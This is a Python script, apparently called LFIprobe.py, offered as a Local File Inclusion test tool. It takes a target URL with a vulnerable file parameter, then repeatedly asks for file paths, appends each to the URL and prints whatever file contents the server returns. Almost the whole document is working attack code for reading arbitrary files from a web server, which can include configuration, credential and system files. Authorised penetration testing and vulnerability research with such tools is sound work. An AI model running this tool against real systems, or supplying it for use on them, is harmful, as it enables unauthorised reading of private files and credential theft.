import argparse
import requests
import urllib.parse
from termcolor import colored

# Check if module termcolor installed
try:
    from termcolor import colored
except ImportError:
    print("[!] 'termcolor' not found, please install with command: \n    pip install termcolor")
    exit(1)

# Band
band = """
-------------------------------------------------
       Local File Inclusion (LFI) Test Tool
-------------------------------------------------
"""

print(colored(band, "cyan"))

# Test file path
def lfi(target_url, file_path):
    file_uri = urllib.parse.quote(file_path)
    url = f"{target_url}{file_uri}"
    
    print(colored(f"[+] Testing file: {file_path}", "blue"))
    try:
        resp = requests.get(url)
        if resp.status_code == 200 and len(resp.text) > 0:
            print(colored(f"[+] File content: \n", "green") + resp.text)
        else:
            print(colored("[!] File is not readable or empty", "red"))
    except requests.exceptions.RequestException as e:
        print(colored(f"[!] Request failed: {e}", "red"))

    print("\n" + "-" * 50 + "\n")


def main():
    # Create parser object with custom formatter
    class CustomFormatter(argparse.ArgumentDefaultsHelpFormatter, argparse.RawTextHelpFormatter):
        pass
    
    parser = argparse.ArgumentParser(description='A Local File Inclusion (LFI) Test Tool', formatter_class=CustomFormatter)
    parser.add_argument('-u', '--url', dest='target_url', required=True, help='Target url including the vulnerable uri path & param.')
   
    sample_usage = """
    [*] Sample Usage:
    \033[91m python3 LFIprobe.py -u \"http://example.com/download.php?file=\"
    """
    parser.epilog = sample_usage

    args = parser.parse_args()

    target_url = args.target_url

    while True:
        file_path = input(colored("[+] Please input file_path (input 'exit' to quit): ", "blue"))
        if file_path.lower() == 'exit':
            print(colored("[!] Exit tool", "yellow"))
            break
        lfi(target_url, file_path)


if __name__ == "__main__":
    main()